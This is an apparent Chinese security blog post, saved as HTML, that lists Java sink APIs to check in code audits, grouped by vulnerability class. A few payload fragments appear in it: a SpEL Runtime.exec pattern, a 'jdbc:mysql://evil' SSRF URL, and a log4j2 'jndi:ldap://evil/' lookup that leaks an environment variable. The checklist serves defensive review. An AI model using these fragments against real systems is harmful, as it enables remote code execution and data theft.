@@ -1,0 +1,369 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Java代码审计 | 尹少欣</title><meta name="author" content="shaoxinSEC"><meta name="copyright" content="shaoxinSEC"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Java安全 | 代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java代码审计">
+<meta property="og:url" content="https://shaoxinsec.github.io/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">
+<meta property="og:site_name" content="尹少欣">
+<meta property="og:description" content="Java安全 | 代码审计">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shaoxinsec.github.io/img/default-cover-3.png">
+<meta property="article:published_time" content="2025-12-18T12:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-18T12:14:50.763Z">
+<meta property="article:author" content="shaoxinSEC">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shaoxinsec.github.io/img/default-cover-3.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Java代码审计",
+  "url": "https://shaoxinsec.github.io/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1",
+  "image": "https://shaoxinsec.github.io/img/default-cover-3.png",
+  "datePublished": "2025-12-18T12:00:00.000Z",
+  "dateModified": "2025-12-18T12:14:50.763Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "shaoxinSEC",
+      "url": "https://shaoxinsec.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://shaoxinsec.github.io/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Java代码审计',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/default-cover-3.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">尹少欣</span></a><a class="nav-page-title" href="/"><span class="site-name">Java代码审计</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Java代码审计</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-18T12:00:00.000Z" title="发表于 2025-12-18 20:00:00">2025-12-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-18T12:14:50.763Z" title="更新于 2025-12-18 20:14:50">2025-12-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><meta name="referrer" content="no-referrer"/>
+
+<p>一、命令执行（RCE）</p>
+<ol>
+<li>Runtime<br> exec(String) &#x2F; exec(String[]) &#x2F; exec(String,String[],File) &#x2F; exec(String[],String[],File)</li>
+<li>ProcessBuilder<br> start() &#x2F; command(…) &#x2F; Directory(…) &#x2F; inheritIO()</li>
+<li>ProcessImpl（JDK 私有，只能通过反射）<br> start(String[],Map,String,Redirect[],boolean) </li>
+<li>UNIXProcess（Linux 私有，同上）<br> start(String[],Map,String,Redirect[],boolean) </li>
+<li>System<br> load(String) &#x2F; loadLibrary(String) </li>
+<li>反射链（常见绕过）<br> Class.forName(“java.lang.ProcessBuilder”)<br> getMethod(“start”).invoke(…)</li>
+<li>Script&#x2F;动态语言<br> GroovyShell.evaluate &#x2F; GroovyClassLoader.parseClass<br> JavaScriptEngine.eval &#x2F; NashornScriptEngine.eval</li>
+<li>SpEL<br> ExpressionParser.parseExpression + T(java.lang.Runtime).getRuntime().exec(…) </li>
+<li>EL &#x2F; OGNL &#x2F; MVEL<br> Ognl.getValue &#x2F; MVEL.eval &#x2F; Fel.eval</li>
+<li>第三方命令封装<br>Apache Commons Exec：CommandLine &#x2F; DefaultExecutor<br>ZT-Process：Processes.newProcess &#x2F; pty4j.PtyProcessBuilder</li>
+</ol>
+<hr>
+<p>二、SQL 注入<br>① JDBC 原生<br>Statement：execute &#x2F; executeQuery &#x2F; executeUpdate &#x2F; executeLargeUpdate<br>② MyBatis<br>占位符（XML或注解）@Select(“ {sql}”) &#x2F; @Update(“${sql}”)<br>③ JPA &#x2F; Hibernate<br>createNativeQuery(sql) &#x2F; createSQLQuery(sql) &#x2F; addEntity(..)<br>@Query(value&#x3D;”native”, nativeQuery&#x3D;true) 拼接<br>④ Spring JdbcTemplate<br>queryForObject(String sql, …) 拼接<br>⑤ Apache DbUtils<br>QueryRunner.query &#x2F; update &#x2F; insert &#x2F; batch 拼接<br>⑥ 其他 ORM<br>jOOQ：DSL.query(sql) 拼接<br>MyBatis-Plus：apply(“xxx”) 拼接</p>
+<hr>
+<p>三、XML 外部实体（XXE）</p>
+<ol>
+<li>DOM<br> DocumentBuilder.parse &#x2F; setFeature</li>
+<li>SAX<br> SAXParser.parse &#x2F; XMLReader.parse</li>
+<li>StAX<br> XMLStreamReader &#x2F; XMLInputFactory.createXMLStreamReader</li>
+<li>JAXB<br> Unmarshaller.unmarshal</li>
+<li>XStream<br> fromXML &#x2F; toXML </li>
+<li>DOM4j<br> SAXReader.read</li>
+<li>jdom2<br> SAXBuilder.build</li>
+<li>POI OOXML（Office 解析）<br> XSSFWorkWorkbook &#x2F; OPCPackage.open</li>
+<li>Spring OXM<br> Jaxb2Marshaller.unmarshal</li>
+<li>搜索关键词<br>“DOCTYPE”、“ENTITY”、“SYSTEM”、“PUBLIC” 直接出现</li>
+</ol>
+<hr>
+<p>四、SSRF</p>
+<ol>
+<li>Java SE<br> new URL(..).openConnection &#x2F; openStream &#x2F; getContent<br> HttpURLConnection.connect &#x2F; getInputStream<br> URLClassLoader.newInstance（可加载远程 jar）</li>
+<li>Apache HttpClient 3.x<br> HttpClient.executeMethod &#x2F; GetMethod &#x2F; PostMethod</li>
+<li>Apache HttpClient 4.x&#x2F;5.x<br> CloseableHttpClient.execute &#x2F; Request.Get &#x2F; Request.Post</li>
+<li>OkHttp<br> OkHttpClient.newCall.execute</li>
+<li>Spring RestTemplate<br> getForObject &#x2F; postForObject &#x2F; exchange</li>
+<li>JAX-RS Client<br> ClientBuilder.newClient().target(url).request().get()</li>
+<li>Netty<br> Bootstrap.connect(host,port)</li>
+<li>邮件客户端<br> JavaMail：Transport.send 若 Properties 的 mail.smtp.host 用户可控</li>
+<li>FTP&#x2F;SFTP<br> FTPClient.connect &#x2F; ChannelSftp.get</li>
+<li>数据库 JDBC URL<br>若 jdbc:mysql:&#x2F;&#x2F;evil&#x2F;mysql 也可触发 DNS 解析</li>
+</ol>
+<hr>
+<p>五、反序列化</p>
+<ol>
+<li><p>原生<br> ObjectInputStream.readObject &#x2F; readUnshared &#x2F; readResolve</p>
+</li>
+<li><p>XML<br> XStream.fromXML </p>
+<p> XMLDecoder.readObject</p>
+</li>
+<li><p>JSON<br> ObjectMapper.enableDefaultTyping &#x2F; readValue<br> Gson.fromJson（带 TypeToken 且含接口&#x2F;抽象类）<br> Fastjson parseObject &#x2F; parse &#x2F; 1.2.68 autoType<br> Jackson PolymorphicDeserialization</p>
+</li>
+<li><p>YAML<br> Yaml.load &#x2F; SnakeYAML Constructor</p>
+</li>
+<li><p>Hessian &#x2F; Burlap<br> HessianInput.readObject</p>
+</li>
+<li><p>JNDI<br> InitialContext.lookup &#x2F; ctx.lookup</p>
+</li>
+<li><p>RMI<br> Registry.lookup &#x2F; RMIConnection.invoke</p>
+</li>
+<li><p>JMX<br> JMXConnectorFactory.connect</p>
+</li>
+<li><p>第三方<br> Kryo.readObject &#x2F; FSTObjectInput.readObject &#x2F; Protostuff</p>
+</li>
+</ol>
+<hr>
+<p>六、表达式&#x2F;模板注入</p>
+<ol>
+<li>SpEL<br> SpelExpressionParser.parseExpression &#x2F; getValue</li>
+<li>OGNL<br> Ognl.getValue &#x2F; setValue &#x2F; OgnlUtil.getValue</li>
+<li>MVEL<br> MVEL.eval &#x2F; compileExpression</li>
+<li>JEXL<br> JexlEngine.createExpression &#x2F; evaluate</li>
+<li>FreeMarker<br> Template.process &#x2F; &lt;@s.include value&#x3D;…&gt;</li>
+<li>Velocity<br> Velocity.evaluate &#x2F; merge</li>
+<li>Thymeleaf<br> #request.getParameter &#x2F; ${…}</li>
+<li>JSP EL<br> ${param.xxx} 拼接再解析</li>
+<li>规则引擎<br> Drools：kSession.insert &#x2F; fireAllRules（规则文本用户可控）</li>
+</ol>
+<hr>
+<p>七、文件&#x2F;路径&#x2F;上传</p>
+<ol>
+<li><p>路径穿越<br> new File(parent,name) &#x2F; FileInputStream &#x2F; FileOutputStream &#x2F; FileReader &#x2F; FileWriter &#x2F; RandomAccessFile </p>
+<p> Path.resolve &#x2F; Paths.get</p>
+</li>
+<li><p>上传<br> MultipartFile.transferTo &#x2F; Item.write &#x2F; FileItem.write</p>
+</li>
+<li><p>解压<br> ZipInputStream.getNextEntry &#x2F; ZipFile.getEntry → ZipSlip<br> TarArchiveInputStream</p>
+</li>
+<li><p>删除&#x2F;重命名<br> File.delete &#x2F; deleteOnExit &#x2F; renameTo </p>
+</li>
+<li><p>目录遍历<br> File.list &#x2F; listFiles &#x2F; walk &#x2F; find</p>
+</li>
+<li><p>临时文件<br> File.createTempFile &#x2F; Files.createTempDirectory（若前缀&#x2F;后缀可控）</p>
+</li>
+<li><p>符号链接<br> Files.createSymbolicLink</p>
+</li>
+<li><p>Office 解析<br> POI：OPCPackage.open &#x2F; XSSFWorkbook → 若路径用户可控</p>
+</li>
+</ol>
+<hr>
+<p>八、信息泄露&#x2F;硬编码</p>
+<ol>
+<li>关键字<br> password&#x3D;、secret&#x3D;、apikey&#x3D;、privateKey&#x3D;、accessKey&#x3D;、jdbc.password</li>
+<li>系统属性<br> System.getProperty &#x2F; setProperty &#x2F; getProperties </li>
+<li>环境变量<br> System.getenv &#x2F; ProcessBuilder.environment()</li>
+<li>异常堆栈<br> e.printStackTrace &#x2F; logger.error(“”,e) 返回到前端</li>
+<li>调试接口<br> &#x2F;actuator&#x2F;env &#x2F; &#x2F;configprops &#x2F; &#x2F;heapdump</li>
+</ol>
+<hr>
+<p>九、反射&#x2F;类加载</p>
+<ol>
+<li>Class<br> Class.forName &#x2F; loadClass &#x2F; getDeclaredMethod &#x2F; getMethod<br> Method.invoke &#x2F; setAccessible</li>
+<li>类加载器<br> URLClassLoader.newInstance &#x2F; defineClass &#x2F; findClass<br> Thread.contextClassLoader</li>
+<li>Unsafe<br> Unsafe.allocateInstance &#x2F; defineAnonymousClass &#x2F; putObject</li>
+<li>Instrumentation<br> Instrumentation.redefineClasses &#x2F; appendToBootstrapClassLoaderSearch</li>
+<li>JNDI<br> Context.lookup &#x2F; DirectoryManager.getObjectInstance</li>
+</ol>
+<hr>
+<p>十、日志伪造</p>
+<ol>
+<li>日志打印<br> log4j1&#x2F;2、logback、JUL：logger.info(“user:” + userInput)</li>
+<li>回车换行<br> 若 userInput 含 \r\n 可伪造多行日志</li>
+<li>log4j2 Lookup<br> jndi:ldap:&#x2F;&#x2F;evil&#x2F; {env:USER} &#x2F; ${java:os}</li>
+</ol>
+<hr>
+<p>十一、拒绝服务&#x2F;资源耗尽——完整版</p>
+<ol>
+<li>线程<br> Thread.start &#x2F; Executor.submit &#x2F; ForkJoinPool 用户可控线程数</li>
+<li>大数组<br> new byte[size]、StringUtils.repeat 若 size 用户可控</li>
+<li>正则<br> Pattern.match &#x2F; replaceAll 使用 “灾难性回溯” 正则</li>
+<li>压缩炸弹<br> ZipInputStream 未限制 entry size &#x2F; ratio</li>
+<li>sleep&#x2F;阻塞<br> Thread.sleep、LockSupport.parkNanos 参数用户可控</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://shaoxinsec.github.io">shaoxinSEC</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://shaoxinsec.github.io/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">https://shaoxinsec.github.io/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://shaoxinsec.github.io" target="_blank">尹少欣</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/default-cover-3.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-redroid" title="Redroid环境搭建"><img class="cover" src="/img/default-cover-2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Redroid环境搭建</div></div><div class="info-2"><div class="info-item-1">  拉取镜像  redroid&#x2F;redroid:13.0.0_64only-latest   &#x2F;&#x2F; Android 13，纯 64 位 redroid&#x2F;redroid:12.0.0_64only-latest   &#x2F;&#x2F; Android 12，纯 64 位 redroid&#x2F;redroid:11.0.0-latest              &#x2F;&#x2F; Android 11，兼容 32 位    redroid&#x2F;redroid:11.0.0-latest是“多架构”镜像（manifest-list），官方同时提供了amd64和arm64两种变体，因此：在原生arm64主机上拉取时，会得到arm64版Android11； 在x86_64主机上拉取时，默认会得到amd64版本  要在x86_64宿主机上运行arm64架构的Android 11，需要显式指定平台并启用QEMU跨架构模拟  1docker run --rm --privileged tonistiigi/binfmt --inst...</div></div></div></a><a class="pagination-related" href="/WEB%E5%AE%89%E5%85%A8" title="WEB安全"><img class="cover" src="/img/default-cover-5.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">WEB安全</div></div><div class="info-2"><div class="info-item-1">     漏洞 原理 对应功能点 危害 or 利用    SQL 注入 用户输入拼进 SQL，数据库把恶意当指令执行 搜索框、筛选栏（LIKE、IN 语句）登录、密码找回（SELECT WHERE 用户名&#x2F;邮箱）分页、排序（ORDER BY 字段名可用户控制）报表导出、多选删除（id 列表拼接）管理后台“快速 SQL”控制台（最危险） 拖库：下载数据库中的全部数据；篡改：修改管理员密码、写入木马   XSS 输入被回显成 HTML，浏览器把脚本当页面跑 昵称、留言、评论、私信、商品评价搜索关键词回显（“您搜索的是：xxx”）错误提示、404 页面（把用户路径直接输出）富文本编辑器（过滤不严，可插&lt;svg&#x2F;onload&gt;）配置系统（网站标题、页脚统计代码） 偷Cookie：拿到管理员登录态，不用密码直接进后台网页挂马：访客打开页面自动下载勒索病毒，或者跳转到其他页面   CSRF 浏览器自动带 Cookie，黑客借受害者身份发请求 修改密码&#x2F;绑定邮箱（缺少旧密码二次校验）后台“一键升级”“重启服务”按钮转账、收货地址修改、隐私设置富文本里嵌...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">shaoxinSEC</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/shaoxinsec"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://gitee.com/shaoxinsec" target="_blank" title="Gitee"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/Docker%E6%90%AD%E5%BB%BAC_C++%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83" title="Docker搭建C/C++开发环境"><img src="/img/default-cover-4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker搭建C/C++开发环境"/></a><div class="content"><a class="title" href="/Docker%E6%90%AD%E5%BB%BAC_C++%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83" title="Docker搭建C/C++开发环境">Docker搭建C/C++开发环境</a><time datetime="2025-12-20T05:47:04.009Z" title="更新于 2025-12-20 13:47:04">2025-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-redroid" title="Redroid环境搭建"><img src="/img/default-cover-2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redroid环境搭建"/></a><div class="content"><a class="title" href="/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-redroid" title="Redroid环境搭建">Redroid环境搭建</a><time datetime="2025-12-19T08:45:26.944Z" title="更新于 2025-12-19 16:45:26">2025-12-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8" title="移动安全"><img src="/img/default-cover-4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="移动安全"/></a><div class="content"><a class="title" href="/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8" title="移动安全">移动安全</a><time datetime="2025-12-19T01:48:01.609Z" title="更新于 2025-12-19 09:48:01">2025-12-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1" title="Java代码审计"><img src="/img/default-cover-3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java代码审计"/></a><div class="content"><a class="title" href="/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1" title="Java代码审计">Java代码审计</a><time datetime="2025-12-18T12:14:50.763Z" title="更新于 2025-12-18 20:14:50">2025-12-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/WEB%E5%AE%89%E5%85%A8" title="WEB安全"><img src="/img/default-cover-5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WEB安全"/></a><div class="content"><a class="title" href="/WEB%E5%AE%89%E5%85%A8" title="WEB安全">WEB安全</a><time datetime="2025-12-14T15:24:19.272Z" title="更新于 2025-12-14 23:24:19">2025-12-14</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By shaoxinSEC</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="1376873330" data-server="netease" data-type="song" data-order="list" data-fixed="true" data-preload="auto" data-autoplay="true" data-mutex="true" data-lrc-type="0"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404') : window.location.href = '/404')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.1"></script></div></div></body></html>
